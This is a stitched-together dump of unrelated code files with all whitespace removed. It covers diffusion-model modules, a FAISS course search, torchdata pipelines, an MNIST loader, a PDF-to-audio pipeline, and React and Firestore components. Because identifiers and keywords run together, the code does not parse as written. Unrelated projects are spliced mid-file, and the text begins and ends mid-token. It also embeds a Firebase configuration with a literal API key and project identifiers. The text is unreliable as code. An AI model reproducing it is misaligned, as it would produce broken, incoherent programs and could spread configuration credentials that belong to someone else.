ropout,))block_in=block_outifcurr_resinattn_resolutions:attn.append(make_attn_cls(block_in,attn_type=attn_type))up=nn.Module()up.block=blockup.attn=attnifi_level!=0:up.upsample=Upsample(block_in,resamp_with_conv)curr_res=curr_res*2self.up.insert(0,up)#prependtogetconsistentorder#endself.norm_out=Normalize(block_in)self.conv_out=make_conv_cls(block_in,out_ch,kernel_size=3,stride=1,padding=1)def_make_attn(self)->Callable:returnmake_attndef_make_resblock(self)->Callable:returnResnetBlockdef_make_conv(self)->Callable:returntorch.nn.Conv2ddefget_last_layer(self,**kwargs):returnself.conv_out.weightdefforward(self,z,**kwargs):#assertz.shape[1:]==self.z_shape[1:]self.last_z_shape=z.shape#timestepembeddingtemb=None#ztoblock_inh=self.conv_in(z)#middleh=self.mid.block_1(h,temb,**kwargs)h=self.mid.attn_1(h,**kwargs)h=self.mid.block_2(h,temb,**kwargs)#upsamplingfori_levelinreversed(range(self.num_resolutions)):fori_blockinrange(self.num_res_blocks+1):h=self.up[i_level].block[i_block](h,temb,**kwargs)iflen(self.up[i_level].attn)>0:h=self.up[i_level].attn[i_block](h,**kwargs)ifi_level!=0:h=self.up[i_level].upsample(h)#endifself.give_pre_end:returnhh=self.norm_out(h)h=nonlinearity(h)h=self.conv_out(h,**kwargs)ifself.tanh_out:h=torch.tanh(h)returnhimportosimportfaissimportjsonimportnumpyasnpfromsentence_transformersimportSentenceTransformerindex=faiss.read_index('semantic_search/models/raymond_index_file.index')withopen('raymond_course_metadata.json','r')asf:courses=json.load(f)courses=courses['data']["courseList"]model=SentenceTransformer('paraphrase-mpnet-base-v2')defgetCourses(query:str,topK:int):try:embedding=model.encode(query,convert_to_tensor=True).cpu().numpy().reshape(1,-1)distances,indices=index.search(embedding,topK)course_results=[]foridx,distinzip(indices[0],distances[0]):course=courses[idx]course_result={"subject":course["subject"],"number":course["number"],"score":float(dist),}course_results.append(course_result)returncourse_resultsexceptExceptionase:print(e)return[]#misspellingsintheessaydefnmisspelled(essay):importenchantd=enchant.Dict("en_US")return(sum([1forwordinessayifnotd.check(word)]))/len(essay)"""partiallyadoptedfromhttps://github.com/openai/improved-diffusion/blob/main/improved_diffusion/gaussian_diffusion.pyandhttps://github.com/lucidrains/denoising-diffusion-pytorch/blob/7706bdfc6f527f58d33f84b7b522e61e6e3164b3/denoising_diffusion_pytorch/denoising_diffusion_pytorch.pyandhttps://github.com/openai/guided-diffusion/blob/0ba878e517b276c45d1195eb29f6f5f72659a05b/guided_diffusion/nn.pythanks!"""importmathfromtypingimportOptionalimporttorchimporttorch.nnasnnfromeinopsimportrearrange,repeatdefget_alpha(merge_strategy:str,mix_factor:Optional[torch.Tensor],image_only_indicator:torch.Tensor,apply_sigmoid:bool=True,is_attn:bool=False,)->torch.Tensor:ifmerge_strategy=="fixed"ormerge_strategy=="learned":alpha=mix_factorelifmerge_strategy=="learned_with_images":alpha=torch.where(image_only_indicator.bool(),torch.ones(1,1,device=image_only_indicator.device),rearrange(mix_factor,"...->...1"),)ifis_attn:alpha=rearrange(alpha,"bt->(bt)11")else:alpha=rearrange(alpha,"bt->b1t11")elifmerge_strategy=="fixed_with_images":alpha=image_only_indicatorifis_attn:alpha=rearrange(alpha,"bt->(bt)11")else:alpha=rearrange(alpha,"bt->b1t11")else:raiseNotImplementedErrorreturntorch.sigmoid(alpha)ifapply_sigmoidelsealphadefmake_beta_schedule(schedule,n_timestep,linear_start=1e-4,linear_end=2e-2,):ifschedule=="linear":betas=(torch.linspace(linear_start**0.5,linear_end**0.5,n_timestep,dtype=torch.float64)**2)returnbetas.numpy()defextract_into_tensor(a,t,x_shape):b,*_=t.shapeout=a.gather(-1,t)returnout.reshape(b,*((1,)*(len(x_shape)-1)))defmixed_checkpoint(func,inputs:dict,params,flag):"""Evaluateafunctionwithoutcachingintermediateactivations,allowingforreducedmemoryattheexpenseofextracomputeinthebackwardpass.Thisdiffersfromtheoriginalcheckpointfunctionborrowedfromhttps://github.com/openai/guided-diffusion/blob/0ba878e517b276c45d1195eb29f6f5f72659a05b/guided_diffusion/nn.pyinthatitalsoworkswithnon-tensorinputs:paramfunc:thefunctiontoevaluate.:paraminputs:theargumentdictionarytopassto`func`.:paramparams:asequenceofparameters`func`dependsonbutdoesnotexplicitlytakeasarguments.:paramflag:ifFalse,disablegradientcheckpointing."""ifflag:tensor_keys=[keyforkeyininputsifisinstance(inputs[key],torch.Tensor)]tensor_inputs=[inputs[key]forkeyininputsifisinstance(inputs[key],torch.Tensor)]non_tensor_keys=[keyforkeyininputsifnotisinstance(inputs[key],torch.Tensor)]non_tensor_inputs=[inputs[key]forkeyininputsifnotisinstance(inputs[key],torch.Tensor)]args=tuple(tensor_inputs)+tuple(non_tensor_inputs)+tuple(params)returnMixedCheckpointFunction.apply(func,len(tensor_inputs),len(non_tensor_inputs),tensor_keys,non_tensor_keys,*args,)else:returnfunc(**inputs)classMixedCheckpointFunction(torch.autograd.Function):@staticmethoddefforward(ctx,run_function,length_tensors,length_non_tensors,tensor_keys,non_tensor_keys,*args,):ctx.end_tensors=length_tensorsctx.end_non_tensors=length_tensors+length_non_tensorsctx.gpu_autocast_kwargs={"enabled":torch.is_autocast_enabled(),"dtype":torch.get_autocast_gpu_dtype(),"cache_enabled":torch.is_autocast_cache_enabled(),}assert(len(tensor_keys)==length_tensorsandlen(non_tensor_keys)==length_non_tensors)ctx.input_tensors={key:valfor(key,val)inzip(tensor_keys,list(args[:ctx.end_tensors]))}ctx.input_non_tensors={key:valfor(key,val)inzip(non_tensor_keys,list(args[ctx.end_tensors:ctx.end_non_tensors]))}ctx.run_function=run_functionctx.input_params=list(args[ctx.end_non_tensors:])withtorch.no_grad():output_tensors=ctx.run_function(**ctx.input_tensors,**ctx.input_non_tensors)returnoutput_tensors@staticmethoddefbackward(ctx,*output_grads):#additional_args={key:ctx.input_tensors[key]forkeyinctx.input_tensorsifnotisinstance(ctx.input_tensors[key],torch.Tensor)}ctx.input_tensors={key:ctx.input_tensors[key].detach().requires_grad_(True)forkeyinctx.input_tensors}withtorch.enable_grad(),torch.cuda.amp.autocast(**ctx.gpu_autocast_kwargs):#Fixesabugwherethefirstopinrun_functionmodifiesthe#Tensorstorageinplace,whichisnotallowedfordetach()'d#Tensors.shallow_copies={key:ctx.input_tensors[key].view_as(ctx.input_tensors[key])forkeyinctx.input_tensors}#shallow_copies.update(additional_args)output_tensors=ctx.run_function(**shallow_copies,**ctx.input_non_tensors)input_grads=torch.autograd.grad(output_tensors,list(ctx.input_tensors.values())+ctx.input_params,output_grads,allow_unused=True,)delctx.input_tensorsdelctx.input_paramsdeloutput_tensorsreturn((None,None,None,None,None)+input_grads[:ctx.end_tensors]+(None,)*(ctx.end_non_tensors-ctx.end_tensors)+input_grads[ctx.end_tensors:])defcheckpoint(func,inputs,params,flag):"""Evaluateafunctionwithoutcachingintermediateactivations,allowingforreducedmemoryattheexpenseofextracomputeinthebackwardpass.:paramfunc:thefunctiontoevaluate.:paraminputs:theargumentsequencetopassto`func`.:paramparams:asequenceofparameters`func`dependsonbutdoesnotexplicitlytakeasarguments.:paramflag:ifFalse,disablegradientcheckpointing."""ifflag:args=tuple(inputs)+tuple(params)returnCheckpointFunction.apply(func,len(inputs),*args)else:returnfunc(*inputs)classCheckpointFunction(torch.autograd.Function):@staticmethoddefforward(ctx,run_function,length,*args):ctx.run_function=run_functionctx.input_tensors=list(args[:length])ctx.input_params=list(args[length:])ctx.gpu_autocast_kwargs={"enabled":torch.is_autocast_enabled(),"dtype":torch.get_autocast_gpu_dtype(),"cache_enabled":torch.is_autocast_cache_enabled(),}withtorch.no_grad():output_tensors=ctx.run_function(*ctx.input_tensors)returnoutput_tensors@staticmethoddefbackward(ctx,*output_grads):ctx.input_tensors=[x.detach().requires_grad_(True)forxinctx.input_tensors]withtorch.enable_grad(),torch.cuda.amp.autocast(**ctx.gpu_autocast_kwargs):#Fixesabugwherethefirstopinrun_functionmodifiesthe#Tensorstorageinplace,whichisnotallowedfordetach()'d#Tensors.shallow_copies=[x.view_as(x)forxinctx.input_tensors]output_tensors=ctx.run_function(*shallow_copies)input_grads=torch.autograd.grad(output_tensors,ctx.input_tensors+ctx.input_params,output_grads,allow_unused=True,)delctx.input_tensorsdelctx.input_paramsdeloutput_tensorsreturn(None,None)+input_gradsdeftimestep_embedding(timesteps,dim,max_period=10000,repeat_only=False):"""Createsinusoidaltimestepembeddings.:paramtimesteps:a1-DTensorofNindices,oneperbatchelement.Thesemaybefractional.:paramdim:thedimensionoftheoutput.:parammax_period:controlstheminimumfrequencyoftheembeddings.:return:an[Nxdim]Tensorofpositionalembeddings."""ifnotrepeat_only:half=dim//2freqs=torch.exp(-math.log(max_period)*torch.arange(start=0,end=half,dtype=torch.float32)/half).to(device=timesteps.device)args=timesteps[:,None].float()*freqs[None]embedding=torch.cat([torch.cos(args),torch.sin(args)],dim=-1)ifdim%2:embedding=torch.cat([embedding,torch.zeros_like(embedding[:,:1])],dim=-1)else:embedding=repeat(timesteps,"b->bd",d=dim)returnembeddingdefzero_module(module):"""Zeroouttheparametersofamoduleandreturnit."""forpinmodule.parameters():p.detach().zero_()returnmoduledefscale_module(module,scale):"""Scaletheparametersofamoduleandreturnit."""forpinmodule.parameters():p.detach().mul_(scale)returnmoduledefmean_flat(tensor):"""Takethemeanoverallnon-batchdimensions."""returntensor.mean(dim=list(range(1,len(tensor.shape))))defnormalization(channels):"""Makeastandardnormalizationlayer.:paramchannels:numberofinputchannels.:return:annn.Modulefornormalization."""returnGroupNorm32(32,channels)#PyTorch1.7hasSiLU,butwesupportPyTorch1.5.classSiLU(nn.Module):defforward(self,x):returnx*torch.sigmoid(x)classGroupNorm32(nn.GroupNorm):defforward(self,x):returnsuper().forward(x.float()).type(x.dtype)defconv_nd(dims,*args,**kwargs):"""Createa1D,2D,or3Dconvolutionmodule."""ifdims==1:returnnn.Conv1d(*args,**kwargs)elifdims==2:returnnn.Conv2d(*args,**kwargs)elifdims==3:returnnn.Conv3d(*args,**kwargs)raiseValueError(f"unsupporteddimensions:{dims}")deflinear(*args,**kwargs):"""Createalinearmodule."""returnnn.Linear(*args,**kwargs)defavg_pool_nd(dims,*args,**kwargs):"""Createa1D,2D,or3Daveragepoolingmodule."""ifdims==1:returnnn.AvgPool1d(*args,**kwargs)elifdims==2:returnnn.AvgPool2d(*args,**kwargs)elifdims==3:returnnn.AvgPool3d(*args,**kwargs)raiseValueError(f"unsupporteddimensions:{dims}")classAlphaBlender(nn.Module):strategies=["learned","fixed","learned_with_images"]def__init__(self,alpha:float,merge_strategy:str="learned_with_images",rearrange_pattern:str="bt->(bt)11",):super().__init__()self.merge_strategy=merge_strategyself.rearrange_pattern=rearrange_patternassert(merge_strategyinself.strategies),f"merge_strategyneedstobein{self.strategies}"ifself.merge_strategy=="fixed":self.register_buffer("mix_factor",torch.Tensor([alpha]))elif(self.merge_strategy=="learned"orself.merge_strategy=="learned_with_images"):self.register_parameter("mix_factor",torch.nn.Parameter(torch.Tensor([alpha])))else:raiseValueError(f"unknownmergestrategy{self.merge_strategy}")defget_alpha(self,image_only_indicator:torch.Tensor)->torch.Tensor:ifself.merge_strategy=="fixed":alpha=self.mix_factorelifself.merge_strategy=="learned":alpha=torch.sigmoid(self.mix_factor)elifself.merge_strategy=="learned_with_images":assertimage_only_indicatorisnotNone,"needimage_only_indicator..."alpha=torch.where(image_only_indicator.bool(),torch.ones(1,1,device=image_only_indicator.device),rearrange(torch.sigmoid(self.mix_factor),"...->...1"),)alpha=rearrange(alpha,self.rearrange_pattern)else:raiseNotImplementedErrorreturnalphadefforward(self,x_spatial:torch.Tensor,x_temporal:torch.Tensor,image_only_indicator:Optional[torch.Tensor]=None,)->torch.Tensor:alpha=self.get_alpha(image_only_indicator)x=(alpha.to(x_spatial.dtype)*x_spatial+(1.0-alpha).to(x_spatial.dtype)*x_temporal)returnx//ImportthefunctionsyouneedfromtheSDKsyouneedimport{initializeApp}from"firebase/app";import{getFirestore}from"firebase/firestore";//Yourwebapp'sFirebaseconfigurationconstfirebaseConfig={apiKey:"AIzaSyCcPYkYA0udiwXLxz9NX3J0mcChsa6syHk",authDomain:"instagrab-5ac0a.firebaseapp.com",projectId:"instagrab-5ac0a",storageBucket:"instagrab-5ac0a.appspot.com",messagingSenderId:"687915372844",appId:"1:687915372844:web:8fc9a9cf0136e50e575c89"};//InitializeFirebaseconstapp=initializeApp(firebaseConfig);constdb=getFirestore(app);exportdefaultdb;fromextract_pdfimportextract_text_from_pdffromget_sectionsimportget_sections,get_slicesfromget_narrationimportget_narrationfromget_imageimportget_imagefromget_musicimportget_musicfromscipy.io.wavfileimportwriteaswrite_wavfrompydub.utilsimportmediainfoimportosfromconcurrent.futuresimportThreadPoolExecutor,as_completedpdf='hobbit.pdf'max_pages=2text=extract_text_from_pdf(pdf,max_pages)words=text.replace('’',"'").replace('“','"').replace('”','"').split()sections=get_sections(words)defget_narration_duration(file_path):"""Getthedurationofthenarrationinseconds."""audio_info=mediainfo(file_path)returnfloat(audio_info['duration'])defprocess_section(i,section):#Savesectiontextwithopen(f'outputs/sections/section_{i}.txt','w')asf:f.write(section)#Generatenarrationfirstnarration_path=f'outputs/narration/section_{i}.mp3'save_narration(section,i)#Getthedurationofthenarrationnarration_duration=get_narration_duration(narration_path)#Generatemusicwiththesamedurationasthenarrationsave_music(section,i,narration_duration)#GenerateimagesconcurrentlywithThreadPoolExecutor()asexecutor:futures=[]#Imagegenerationtaskfutures.append(executor.submit(save_image,section,i))#Waitforimagegenerationtocompleteforfutureinas_completed(futures):future.result()defsave_narration(section,i):"""Generateandsavenarration."""path=f'outputs/narration/section_{i}.mp3'narration=get_narration(section)withopen(path,'wb')asf:f.write(narration)defsave_image(section,i):"""Generateandsaveanimage."""path=f'outputs/images/section_{i}.png'image=get_image(section,model='dall-e-2',size='256x256')image.save(path)defsave_music(section,i,duration):"""Generateandsavemusicbasedonnarrationduration."""path=f'outputs/music/section_{i}.mp3'music,sampling_rate=get_music(section,seconds=int(duration))write_wav(path,rate=sampling_rate,data=music[0,0].cpu().numpy())#CreateaThreadPoolExecutortoprocesssectionsconcurrentlywithThreadPoolExecutor()asexecutor:futures=[executor.submit(process_section,i,section)fori,sectioninenumerate(sections)]#Waitforallsectionstobeprocessedforfutureinas_completed(futures):future.result()#Raiseexceptionsifanyoccurinathread#Customdatapipes,partlycopiedfromrelease0.6.0toalsosupport0.5.1,shoutouttopytorchandtorchdataimportosimporttarfileimporttimeimportwarningsfromioimportBufferedIOBase,RawIOBaseimportrefromtypingimport(Iterator,List,Tuple,Optional,cast,IO,Callable,Dict,Union,)importrandomimportgcfromcollectionsimportdequeimportnumpyasnpimporttorchfromtorchdata.datapipes.iterimportIterDataPipefromtorchdata.datapipes.iterimportTarArchiveLoaderfromtorchdata.datapipes.utils.commonimportvalidate_pathname_binary_tuplefromtorch.utils.data.datapipes.utils.commonimportStreamWrapperimportwebdatasetaswdsdef_is_stream_handle(data):obj_to_check=data.file_objifisinstance(data,StreamWrapper)elsedatareturnisinstance(obj_to_check,(BufferedIOBase,RawIOBase))def_shard_expand(s:str)->List[str]:expansion=r"\{[0-9]+\.\.[0-9]+\}"m=re.search(expansion,s)ifnotm:return[s]prefix=s[:m.start()]rest=_shard_expand(s[m.end():])rng=s[m.start()+1:m.end()-1]lohi=rng.split("..")iflen(lohi[0])==len(lohi[1])andlohi[0].startswith("0"):fmt="{prefix}{i:0>{l}d}{r}"eliflen(lohi[0])<=len(lohi[1]):iflohi[0].startswith("0")andlohi[0]!="0":raiseValueError("shard_expand:lowboundmustnotstartwith0iflowboundisshorter")fmt="{prefix}{i}{r}"else:raiseValueError("shard_expand:lowboundmustbeshorterthanhighbound")lo,hi=(int(x)forxinlohi)iflo>=hi:raiseValueError(f"shard_expand:badrangeininshardspec{s}.")result=[]foriinrange(lo,hi+1):forrinrest:expanded:str=fmt.format(prefix=prefix,i=i,r=r,l=len(lohi[1]))result.append(expanded)returnresultclassCustomShardExpanderIterDataPipe(IterDataPipe[str]):r"""Expandsincomingshardstringsintoshards.Shardeddatafilesarenamedusingshell-likebracenotation.Forexample,anImageNetdatasetshardedinto1200shardsandstoredonawebservermightbenamed`imagenet-{000000..001199}.tar`.Notethatshardnamescanbeexpandedwithoutanyservertransactions;thismakes`shard_expand`reproducibleandstoragesystemindependent(unlike:class`.FileLister`etc.).Args:source_datapipe:aDataPipeyieldingastreamofpairsReturns:aDataPipeyieldingastreamofexpandedpathnames.Example:fromtorchdata.datapipes.iterimportIterableWrapper>>>source_dp=IterableWrapper(["ds-{00..05}.tar"])>>>expand_dp=source_dp.shard_expand()>>>list(expand_dp)['ds-00.tar','ds-01.tar','ds-02.tar','ds-03.tar','ds-04.tar','ds-05.tar']>>>source_dp=IterableWrapper(["imgs_{00..05}.tar","labels_{00..05}.tar"])>>>expand_dp=source_dp.shard_expand()>>>list(expand_dp)['imgs_00.tar','imgs_01.tar','imgs_02.tar','labels_00.tar','labels_01.tar','labels_02.tar']"""def__init__(self,source_datapipe:IterDataPipe[str])->None:super().__init__()self.source_datapipe:IterDataPipe[str]=source_datapipedef__iter__(self)->Iterator[str]:forpathinself.source_datapipe:yieldfrom_shard_expand(path)classSeedSetter(IterDataPipe):"""Resetstheseedoncallof__iter__(invokedinthereset()method"""def__init__(self,datapipe,debug=False):super().__init__()self.datapipe=datapipeself.is_init=Falseself.debug=False##defreset(self):defreset(self):#thiswillbecalledwhenever__iter__isinvokedagain(thisshouldbekeptinmindforshufflingifnotself.is_init:#weonlywannadothisonceself.is_init=Trueworker_info=torch.utils.data.get_worker_info()ifworker_info:worker_id=worker_info.idnewseed=np.random.get_state()[1][0]+worker_idifself.debug:print(f"Worker#{worker_id}reseedingwith{newseed}")np.random.seed(newseed)torch.random.manual_seed(newseed)random.seed(newseed)def__iter__(self)->Iterator[Tuple[str,BufferedIOBase]]:#self.set_seed()#print(f'seedinworkerinit:{seed}')fordatainself.datapipe:yielddataclassSplitByWorker(IterDataPipe):"""distributeddataacrossworkerstomimicbehaviorofshardsplittinginwebdataset"""def__init__(self,datapipe,debug:bool=False):super().__init__()self.datapipe=datapipe#self.drop_last=drop_lastself.worker_id=0self.num_workers=1self.debug=debugself.do_print=Truedefreset(self):#thiswillbecalledwhenever__iter__isinvokedagain(thisshouldbekeptinmindforshufflingworker_info=torch.utils.data.get_worker_info()ifself.debug:print(f"worker{worker_info}configured")ifworker_info:self.worker_id=worker_info.idself.num_workers=worker_info.num_workersdef__iter__(self)->Iterator[Tuple[str,BufferedIOBase]]:fori,datainenumerate(self.datapipe):##avoidhangingduetounevennumberofshardsperworkerifi%self.num_workers==self.worker_id:ifself.debugandself.do_print:print(f"dataworker{self.worker_id}gotfirstshard{data}")self.do_print=FalseyielddataclassPrefixResampler(IterDataPipe):def__init__(self,datapipe:IterDataPipe[Tuple],prefixes:List[str],ps:List[float]=None,is_braceexpand:bool=False,buffersize_per_prefix:Union[int,Dict]=100000,custom_seeding:bool=True,debug:bool=True,handler:Callable=wds.reraise_exception,):super().__init__()self.source=datapipeifis_braceexpand:#onlydirsprefixes=[os.path.split(p.split("{")[0])[0]forpinprefixes]assertlen(set(prefixes))==len(prefixes),"Prefixesshouldbeunique"self.ps={k:pfork,pinzip(prefixes,ps)}print(f"{self.__class__.__name__}gotthefollowingprefixes:{prefixes}")ifisinstance(buffersize_per_prefix,int):buffersize_per_prefix={pref:buffersize_per_prefixforprefinprefixes}assertlen(buffersize_per_prefix)==len(prefixes),f"Buffersizeperprefix(len={len(buffersize_per_prefix)})hastohavethesamelengththanprefixes(len={len(prefixes)})"self.url_buffer={prf:deque(maxlen=buffersize_per_prefix[prf])forprfinprefixes}self.warn_once={prf:Trueforprfinself.url_buffer}sum_=sum(list(self.ps.values()))self.ps={k:self.ps[k]/sum_forkinself.ps}print(f"Gotthefollowing(prob,prefix)pairsfor{len(self.ps)}prefixes{[(k,p)fork,pinself.ps.items()]}")self.handler=handlerself.is_init=notcustom_seedingself.debug=debugassertnp.isclose(sum(self.ps.values()),1.0),"Probabilitiesmusthavethesamelengththanprefixandmustsumupto1"defreset(self):ifself.debug:worker_info=torch.utils.data.get_worker_info()ifworker_info:worker_id=worker_info.idprint(f"Worker#{worker_id}hasseed{np.random.get_state()[1][0]}")def__iter__(self):keep_target=Falsetarget_prefix=Noneforurlinself.source:try:assertisinstance(url,(tuple,Tuple)),f"sourcedatapipeof{self.__class__.__name__}shouldyieldtuples"key,content=urlifnotkeep_target:keep_target=Truetarget_prefix=np.random.choice(list(self.ps),1,p=list(self.ps.values())).item()current_prefix=list(filter(lambdax:key.startswith(x),self.ps))ifnotlen(current_prefix)==1:raiseValueError(f"thereceivedprefixisnon-uniqueandmatches"f"allof{current_prefix},aborting")current_prefix=current_prefix[0]if(len(self.url_buffer[current_prefix])>=self.url_buffer[current_prefix].maxlen):maxsize=self.url_buffer[current_prefix].maxlenifself.warn_once[current_prefix]:self.warn_once[current_prefix]=Falsewarnings.warn(f"buffersizeforprefix{current_prefix}in{self.__class__.__name__}exceedsitsmaxbuffersize{maxsize},"f"thusdiscardingthiselement."f"Isthisintended?")else:self.url_buffer[current_prefix].append(url)ifcurrent_prefix==target_prefix:keep_target=False#FIFOout=self.url_buffer[target_prefix].popleft()[1]yieldoutexceptExceptionase:ifself.handler(e):passelse:raiseeclassDataset2SamplesConverter(IterDataPipe):def__init__(self,datapipe:IterDataPipe,handler:Callable=wds.reraise_exception):super().__init__()self.datapipe=datapipeself.handler=handlerdef__iter__(self)->Iterator[Dict]:try:forsampleinself.datapipe:try:#dict-stylesamplefromtuplekey=os.path.split(sample[0][0])[-1].split(".")[0]url=os.path.split(sample[0][0])[0]out={}forsinsample:key_=(s[0].split(key)[-1][1:]ifs[0].split(key)[-1].startswith(".")elses[0].split(key)[-1])data=s[1]if_is_stream_handle(data):ds=data#Thebehaviorof.readcandifferbetweenstreams(e.g.HTTPResponse),hencethisisusedinsteaddata=b"".join(data)ds.close()deldsout[key_]=datadeldatasample=outdeloutsample["__key__"]=keysample["__url__"]=urlyieldsampleexceptExceptionasexn:ifself.handler(exn):gc.collect()continueelse:breakexceptExceptionase:ifself.handler(e):print(f"Catchedexceptionin{self.__class__.__name__}:",e)else:print(f"Catchedexceptionin{self.__class__.__name__}:",e)raiseeclassTarArchiveLoaderAndCloser(TarArchiveLoader):def__init__(self,handler:Callable=wds.reraise_exception,*args,**kwargs):super().__init__(*args,**kwargs)self.handler=handlerself.times=Noneself.profile=Falsedef__iter__(self)->Iterator[Tuple[str,BufferedIOBase]]:fordatainself.datapipe:start=time.perf_counter()validate_pathname_binary_tuple(data)pathname,data_stream=datatry:ifisinstance(data_stream,StreamWrapper)andisinstance(data_stream.file_obj,tarfile.TarFile):tar=data_stream.file_objelse:reading_mode=(self.modeifhasattr(data_stream,"seekable")anddata_stream.seekable()elseself.mode.replace(":","|"))#typing.castisusedheretosilencemypy'stypecheckertar=tarfile.open(fileobj=cast(Optional[IO[bytes]],data_stream),mode=reading_mode,)ifself.profile:self.open_times.append(time.perf_counter()-start)try:fortarinfointar:start=time.perf_counter()ifnottarinfo.isfile():continueextracted_fobj=tar.extractfile(tarinfo)ifextracted_fobjisNone:warnings.warn(f"failedtoextractfile{tarinfo.name}fromsourcetarfile{pathname}")raisetarfile.ExtractErrorinner_pathname=os.path.normpath(os.path.join(pathname,tarinfo.name))sw=StreamWrapper(extracted_fobj,data_stream,name=inner_pathname)#type:ignore[misc]ifself.profile:self.extract_times.append(time.perf_counter()-start)yieldinner_pathname,sw#sw.autoclose()delsw#closetarfileafterit'sbeenexceededfinally:tar.close()deltardeltarinfoif_is_stream_handle(data_stream):data_stream.autoclose()deldata_streamgc.collect()exceptExceptionase:warnings.warn(f"Unabletoextractfilesfromcorruptedtarfilestream{pathname}dueto:{e},abort!")ifself.handler(e):ifhasattr(e,"args")andlen(e.args)>0:e.args=(e.args[0]+"@"+str(pathname),)+e.args[1:]else:raiseeimportReact,{useState}from'react';functionLogin(){const[username,setUsername]=useState('');const[password,setPassword]=useState('');constlogin=()=>{};return(<divclassName='login'><label>Login</label><inputplaceholder='Username'onChange={(event)=>{setUsername(event.target.value);}}/><inputplaceholder='Password'type='password'onChange={(event)=>{setPassword(event.target.value);}}/><buttononClick={login}>Login</button></div>);}exportdefaultLogin;fromtypingimportDictimportwebdatasetaswdsfromtorchdata.datapipes.iterimportIterDataPipefrom.datasetimportcreate_datasetclassDummyIterator(IterDataPipe):def__init__(self,sample:Dict):super().__init__()self.sample=sampledef__iter__(self):whileTrue:yieldself.sampleclassDummyDataPipeline(wds.DataPipeline,wds.compat.FluidInterface):def__init__(self,datapipe:IterDataPipe):super().__init__()self.append(datapipe)defcreate_dummy_dataset(*args,**kwargs):datapipe=create_dataset(*args,**kwargs)sample=next(iter(datapipe))deldatapipeiterator=DummyIterator(sample)datapipeline=DummyDataPipeline(iterator)returndatapipelinefromtransformersimportTFAutoModelForSequenceClassificationnum_labels=max(y_train+y_test+y_val)+1#Add1since0canbealabelmodel=TFAutoModelForSequenceClassification.from_pretrained(model_checkpoint,num_labels=num_labels)importpytorch_lightningasplimporttorchvisionfromtorch.utils.dataimportDataLoader,DatasetfromtorchvisionimporttransformsclassMNISTDataDictWrapper(Dataset):def__init__(self,dset):super().__init__()self.dset=dsetdef__getitem__(self,i):x,y=self.dset[i]return{"jpg":x,"cls":y}def__len__(self):returnlen(self.dset)classMNISTLoader(pl.LightningDataModule):def__init__(self,batch_size,num_workers=0,prefetch_factor=2,shuffle=True):super().__init__()transform=transforms.Compose([transforms.ToTensor(),transforms.Lambda(lambdax:x*2.0-1.0)])self.batch_size=batch_sizeself.num_workers=num_workersself.prefetch_factor=prefetch_factorifnum_workers>0else0self.shuffle=shuffleself.train_dataset=MNISTDataDictWrapper(torchvision.datasets.MNIST(root=".data/",train=True,download=True,transform=transform))self.test_dataset=MNISTDataDictWrapper(torchvision.datasets.MNIST(root=".data/",train=False,download=True,transform=transform))defprepare_data(self):passdeftrain_dataloader(self):returnDataLoader(self.train_dataset,batch_size=self.batch_size,shuffle=self.shuffle,num_workers=self.num_workers,prefetch_factor=self.prefetch_factor,)deftest_dataloader(self):returnDataLoader(self.test_dataset,batch_size=self.batch_size,shuffle=self.shuffle,num_workers=self.num_workers,prefetch_factor=self.prefetch_factor,)defval_dataloader(self):returnDataLoader(self.test_dataset,batch_size=self.batch_size,shuffle=self.shuffle,num_workers=self.num_workers,prefetch_factor=self.prefetch_factor,)if__name__=="__main__":dset=MNISTDataDictWrapper(torchvision.datasets.MNIST(root=".data/",train=False,download=True,transform=transforms.Compose([transforms.ToTensor(),transforms.Lambda(lambdax:x*2.0-1.0)]),))ex=dset[0]importReactfrom'react';importReactDOMfrom'react-dom/client';import'./index.css';importAppfrom'./App';import{BrowserRouter,Routes,Route}from'react-router-dom';import{store}from'./app/store';import{Provider}from'react-redux';constroot=ReactDOM.createRoot(document.getElementById('root'));root.render(<React.StrictMode><Providerstore={store}><BrowserRouter><Routes><Routepath='/*'element={<App/>}/></Routes></BrowserRouter></Provider></React.StrictMode>);import{db}from'@/firebase/firebase';import{doc,updateDoc}from'firebase/firestore';constupdateCompletedQuestions=async(question,userId,category,completedQuestions,missedQuestions)=>{if(completedQuestions.includes(question.id)){returncompletedQuestions;}constdocRef=doc(db,'users',userId);constpayload={[category]:{completedQuestions:[...completedQuestions,question.id],missedQuestions:missedQuestions,},};awaitupdateDoc(docRef,payload);return[...completedQuestions,question.id];};constupdateMissedQuestions=async(question,userId,category,completedQuestions,missedQuestions)=>{constdocRef=doc(db,'users',userId);constpayload={[category]:{completedQuestions:completedQuestions,missedQuestions:[...missedQuestions,question.id],},};awaitupdateDoc(docRef,payload);return[...missedQuestions,question.id];};constreplaceMissedQuestions=async(userId,category,completedQuestions,missedQuestions)=>{constdocRef=doc(db,'users',userId);constpayload={[category]:{completedQuestions:completedQuestions,missedQuestions:missedQuestions,},};awaitupdateDoc(docRef,payload);returnmissedQuestions;};export{updateCompletedQuestions,updateMissedQuestions,replaceMissedQuestions};constClassPosts=()=>{constposts=[{id:1,classId:'calculus',title:'Howtosolvedifficultintegrals?',author:'Alice',content:'Ineedhelpwithsolvingsomecomplexintegrals.',upvotes:10,},{id:2,classId:'physics',title:'BestresourcesforNewtonianphysics?',author:'Bob',content:'WhatarethebestresourcesforunderstandingNewtonianmechanics?',upvotes:5,},{id:3,classId:'chemistry',title:'Organicchemistrytips?',author:'Charlie',content:'Anytipsforunderstandingreactionmechanismsinorganicchemistry?',upvotes:8,},];return(<div><h2className='text-2xlfont-boldmb-4'>Posts</h2><divclassName='space-y-4'>{posts.length>0?(posts.map((post)=>(<divkey={post.id}className='borderp-4rounded-mdshadowtransformtransition-transformhover:shadow-lghover:bg-gray-100cursor-pointerduration-200ease-out'onClick={()=>(window.location.href=`/${post.classId}/${post.id}`)}><h3className='text-lgfont-semibold'>{post.title}</h3><pclassName='text-gray-600mb-2'>{post.author}</p><pclassName='text-gray-800'>{post.content}</p><divclassName='flexitems-centermt-2'><buttonclassName='mr-4text-blue-500hover:text-blue-700'>Upvote({post.upvotes})</button><buttonclassName='text-blue-500hover:text-blue-700'>Comment</button></div></div>))):(<p>Nopostsavailableatthemoment.</p>)}</div></div>);};exportdefaultClassPosts;constHeader=()=>{consthandleSubmit=(e)=>{};return(<div><formclassName='flexcontent-centerspace-x-2mt-5mb-5'onSubmit={handleSubmit}><inputclasName='px-3py-2borderborder-gray-300rounded-lgfocus:outline-nonefocus:ring-2focus:ring-green-500'type='text'id='pgn-input'name='pgn'placeholder='EnterPGN'/><buttonclassName='px-4py-2rounded-fullbg-green-100hover:bg-green-200focus:outline-none'type='submit'>Submit</button></form></div>);};exportdefaul